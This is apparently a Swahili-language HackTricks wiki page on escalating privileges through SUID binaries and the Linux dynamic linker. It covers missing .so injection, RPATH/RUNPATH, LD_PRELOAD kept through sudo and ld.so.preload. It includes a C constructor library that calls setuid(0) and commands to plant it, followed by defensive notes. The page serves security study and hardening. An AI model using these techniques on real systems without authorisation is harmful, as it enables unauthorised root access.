# Matumizi Mabaya ya Shared Library na Linker ya SUID

{{#include ../../banners/hacktricks-training.md}}

SUID binaries kwa kawaida hukaguliwa kwa ajili ya direct command execution, lakini custom SUID programs pia zinaweza kuwa vulnerable kupitia dynamic linker. Dhana ya kawaida ni rahisi: executable yenye privileges hupakia code kutoka kwenye path au configuration ambayo mtumiaji mwenye privileges za chini anaweza kuathiri.<sup>[[1]](#references)</sup>

Ukurasa huu unalenga generic technique patterns: missing libraries, writable library directories, `RPATH`/`RUNPATH`, `LD_PRELOAD` kupitia sudo, linker configuration, na SUID hardlink confusion.

## Fast Enumeration

Anza kwa kutafuta SUID files zisizo za kawaida na kukagua ikiwa ni dynamically linked:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Zingatia maeneo yasiyo ya kawaida, njia maalum za programu, binary zinazomilikiwa na root lakini ziko nje ya directories zinazosimamiwa na package, na dependencies zinazopakiwa kutoka kwenye directories zinazoweza kuandikwa.<sup>[[1]](#references)</sup>

Ukaguzi muhimu wa uwezekano wa kuandikwa:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Baadhi ya custom SUID binaries hujaribu kupakia shared object ambayo haipo. Ikiwa path hiyo haipo chini ya directory inayodhibitiwa na mshambuliaji, binary inaweza kupakia code iliyotolewa na mshambuliaji ikiwa na haki za effective user.<sup>[[1]](#references)</sup>

Tafuta library lookups zilizoshindwa kwa kutumia `strace`'s syscall filter:<sup>[[2]](#references)</sup>
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Ikiwa binary itatafuta `libexample.so` katika path inayoweza kuandikwa, proof library ndogo inaweza kutumia constructor. Weka proof-of-impact ikiwa haina madhara wakati wa validation:<sup>[[6]](#references)</sup>
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Iunde kwa kutumia jina halisi la faili ambalo binary inajaribu kupakia:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
Hali inayoweza kutumiwa vibaya si ukosefu wa library pekee. Mshambuliaji lazima aweze kuweka shared object inayooana kwenye path ambayo loader yenye mamlaka itakubali.<sup>[[1]](#references)</sup>

## Writable Library Directory

Wakati mwingine dependencies zote zinapatikana, lakini moja ya directories zinazotumika kuzitatua inaweza kuandikika. Hii inaweza kuruhusu kubadilisha library iliyopakiwa au kuweka library yenye kipaumbele cha juu zaidi yenye jina lilelile.<sup>[[1]](#references)</sup>

Kagua dependency paths:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Ikiwa directory inaweza kuandikwamo, thibitisha kwa kutumia njia salama ya kunakili katika lab. Kubadilisha system libraries kwenye host inayotumika kunaweza kuacha processes zinazoanza kwa wakati mmoja zikiwa na library versions zisizolingana.<sup>[[8]](#references)</sup>

## RPATH and RUNPATH

`RPATH` na `RUNPATH` ni entries za dynamic-section zinazoeleza loader mahali pa kutafuta libraries. Ni hatari katika SUID programs zinapoelekeza kwenye directories zinazoweza kuandikwamo na attacker.<sup>[[1]](#references)</sup>

Zigundue:<sup>[[3]](#references)[[10]](#references)</sup>
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Mfano wa matokeo hatari:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Ikiwa `/opt/app/lib` inaweza kuandikika na binary inahitaji `libcustom.so`, mshambulizi anaweza kuweka `libcustom.so` hasidi hapo:<sup>[[1]](#references)</sup>
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` na `RUNPATH` hazifanani katika maelezo yote ya utatuzi, lakini kwa ukaguzi wa privilege-escalation swali la kivitendo ni lilelile: je, SUID binary hutafuta library name katika directory ambayo attacker anaweza kuandika?<sup>[[1]](#references)</sup>

## LD_PRELOAD, LD_LIBRARY_PATH na SUID

Kwa programs za kawaida, `LD_PRELOAD` na `LD_LIBRARY_PATH` zinaweza kulazimisha au kuathiri upakiaji wa shared object. Kwa programs za SUID, dynamic loader kwa kawaida huingia katika secure-execution mode na kupuuza environment variables hatari.<sup>[[1]](#references)</sup>

Hii inamaanisha kuwa plain SUID binary kwa kawaida si vulnerable kwa sababu tu user anaweza kuweka `LD_PRELOAD`:<sup>[[1]](#references)</sup>
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
Isipokuwa la kawaida ni sudo policy inayoruhusu kuweka au kuhifadhi loader variables kwa target command. Kagua `sudo -l` ili kuona entries kama `env_keep+=LD_PRELOAD` au `env_keep+=LD_LIBRARY_PATH`; ikiwa target imeunganishwa dynamically, inaweza kupakia code inayodhibitiwa na attacker:<sup>[[4]](#references)[[5]](#references)</sup>
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Usichanganye hali hizi; loader na sheria za sudo policy hapo juu zinazitofautisha:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- `LD_PRELOAD` dhidi ya binary ya kawaida ya SUID: kwa kawaida huzuiwa na secure execution.
- `LD_PRELOAD` iliyohifadhiwa na sudo: inaweza kutumiwa vibaya.
- `.so` iliyokosekana katika path inayoweza kuandikwa: inaweza kutumiwa vibaya wakati binary ya SUID inapopakia path hiyo kwa kawaida.
- `RPATH`/`RUNPATH` inayoelekea kwenye directory inayoweza kuandikwa: inaweza kutumiwa vibaya wakati library inayohitajika inaweza kudhibitiwa.
- Ruhusa ya kuandika kwenye `/etc/ld.so.preload` au linker config: inaathiri mfumo mzima na ina athari kubwa.

## Linker Configuration

`ld.so` hutumia linker cache na `/etc/ld.so.preload`; `ldconfig` huunda cache hiyo kutoka `/etc/ld.so.conf` na files zilizoingizwa kutoka humo, kwa kawaida `/etc/ld.so.conf.d/`.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Ukaguzi wenye thamani kubwa:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Writable linker configuration kwa kawaida ni hatari zaidi kuliko SUID binary moja iliyo hatarini kwa sababu inaweza kuathiri processes nyingi zinazotumia dynamic linking. `/etc/ld.so.preload` ni hatari hasa kwa sababu inaweza kulazimisha shared object kuingizwa kwenye processes zenye privileges.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## SUID Hardlink Confusion

Hardlinks zinaweza kufanya inode ileile ya SUID ionekane chini ya majina mengi.<sup>[[9]](#references)</sup> Hii ni muhimu kwa kuficha privileged helper, kuchanganya cleanup, au kukwepa ukaguzi rahisi unaotegemea path.

Tafuta SUID files zilizo na link zaidi ya moja:<sup>[[9]](#references)</sup>
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Kagua njia zote zinazoelekeza kwenye inode hiyo hiyo:<sup>[[9]](#references)</sup>
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
Matumizi mabaya si kwamba hardlink hubadilisha permissions. Matumizi mabaya ni path confusion: inode yenye privileged inaweza kufikiwa kupitia jina ambalo defenders au scripts hawatarajii.<sup>[[9]](#references)</sup> Kwa workflow ya kina zaidi ya inode na hardlink, tazama [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Defensive Notes

- Weka SUID binaries ziwe chache, zikaguliwe, na zidhibitiwe na package pale inapowezekana.
- Epuka entries za `RPATH`/`RUNPATH` zinazoelekeza kwenye directories zinazoandikika au zinazosimamiwa na application.<sup>[[1]](#references)[[8]](#references)</sup>
- Weka library directories zimilikiwe na root na zisiweze kuandikwa na users wa kawaida.<sup>[[8]](#references)</sup>
- Usihifadhi `LD_PRELOAD`, `LD_LIBRARY_PATH`, au loader variables zinazofanana kupitia sudo.<sup>[[1]](#references)[[5]](#references)</sup>
- Fuatilia `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, na SUID files zisizotarajiwa.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- Kagua SUID files zilizo na hardlink na chunguza SUID wrappers maalum zilizo nje ya standard system paths.<sup>[[9]](#references)</sup>

## References

- [1] [ld.so(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — Linux manual page](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf (GNU Binary Utilities)](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — Linux manual page](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — Linux manual page](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [Common Attributes (GCC)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [Dynamic Linker Hardening (The GNU C Library)](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [Hard Links (GNU Findutils)](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
{{#include ../../banners/hacktricks-training.md}}
